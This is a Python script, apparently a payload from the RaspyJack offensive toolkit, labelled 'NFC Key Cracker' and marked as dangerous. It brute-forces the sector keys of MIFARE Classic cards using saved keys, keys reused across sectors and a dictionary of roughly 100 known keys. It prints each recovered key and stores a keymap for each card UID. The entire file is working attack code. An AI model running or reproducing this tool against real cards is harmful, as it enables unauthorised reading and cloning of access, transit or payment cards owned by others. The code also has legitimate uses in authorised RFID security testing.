#!/usr/bin/env python3
# @name: NFC Key Cracker
# @desc: Brute-force MIFARE Classic sector keys with extended dictionary (~100 keys).
# @category: nfc_rfid
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- NFC Key Cracker
======================================
Brute-force MIFARE Classic sector keys with extended dictionary (~100 keys).
Visual progress grid showing cracked/locked/active sectors.

Controls:
  Usage: nfc_crack.py

  Prompts for card placement, then cracks each sector in turn, printing
  progress (sector, key tried, cracked/locked) to stdout. After each
  card the keymap is saved automatically. Prompts to scan another card
  or quit. Press Ctrl-C at any time to stop early.
"""

from payloads._web_input import request_input
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads.nfc_rfid._nfc_driver import auto_detect, is_classic
from payloads.nfc_rfid._nfc_keys import KNOWN_KEYS, save_keymap, load_keymap


def _prompt(msg):
    try:
        return request_input(msg).strip()
    except EOFError:
        return ""


def _crack_card(drv, card):
    n_sectors = 16 if "4K" not in card.card_type else 40
    print(f"UID: {card.uid_hex}  Sectors: {n_sectors}  Dict size: {len(KNOWN_KEYS)}", flush=True)

    saved_keys = load_keymap(card.uid_hex)
    results = []
    start_time = time.time()

    for sec in range(n_sectors):
        block = sec * 4
        found_key = None
        found_kt = 0x60

        # Try saved key first
        if saved_keys:
            for sk in saved_keys:
                if sk.get("sector") == sec and sk.get("cracked"):
                    try:
                        k = bytes.fromhex(sk["key"])
                        kt = 0x60 if sk.get("key_type") == "A" else 0x61
                        if drv.mifare_auth(block, k, card.uid, kt):
                            found_key = k
                            found_kt = kt
                            break
                    except Exception:
                        pass

        # Reuse keys from cracked sectors
        if not found_key:
            for r in results:
                if r["cracked"] and r["key"]:
                    k = bytes.fromhex(r["key"])
                    for kt in [0x60, 0x61]:
                        if drv.mifare_auth(block, k, card.uid, kt):
                            found_key = k
                            found_kt = kt
                            break
                    if found_key:
                        break

        # Full dictionary
        if not found_key:
            for key in KNOWN_KEYS:
                for kt in [0x60, 0x61]:
                    if drv.mifare_auth(block, key, card.uid, kt):
                        found_key = key
                        found_kt = kt
                        break
                if found_key:
                    break

        results.append({
            "sector": sec,
            "key": found_key.hex().upper() if found_key else "",
            "key_type": "A" if found_kt == 0x60 else "B",
            "cracked": found_key is not None,
        })

        cracked = sum(1 for r in results if r["cracked"])
        elapsed = int(time.time() - start_time)
        if found_key:
            print(f"  Sector {sec:02d}/{n_sectors}  KEY {results[-1]['key']} ({results[-1]['key_type']})  "
                  f"[{cracked}/{sec + 1} cracked, {elapsed}s]", flush=True)
        else:
            print(f"  Sector {sec:02d}/{n_sectors}  LOCKED  "
                  f"[{cracked}/{sec + 1} cracked, {elapsed}s]", flush=True)

    elapsed = int(time.time() - start_time)
    cracked = sum(1 for r in results if r["cracked"])
    print(f"Done: {cracked}/{len(results)} sectors cracked in {elapsed}s.", flush=True)
    return results


def main():
    print("Detecting reader...", flush=True)
    drv, drv_desc = auto_detect()
    print(f"Reader: {drv_desc}", flush=True)
    if not drv:
        print("No NFC reader connected.", flush=True)
        return 1

    try:
        while True:
            _prompt("Place card on reader, then press Enter (Ctrl-C to quit)...")
            print("Polling...", flush=True)
            card = drv.read_passive_target(timeout=8.0)
            if not card:
                print("No card detected.", flush=True)
            elif not is_classic(card):
                print(f"Not Classic: {card.card_type}", flush=True)
            else:
                results = _crack_card(drv, card)
                if results:
                    save_keymap(card.uid_hex, results)
                    print(f"Keymap saved for {card.uid_hex}.", flush=True)

            choice = _prompt("Scan another card? [y/N]: ").lower()
            if choice != "y":
                break
    except KeyboardInterrupt:
        print("\nStopped by user.", flush=True)
    finally:
        if drv:
            drv.close()

    print("Exiting.", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
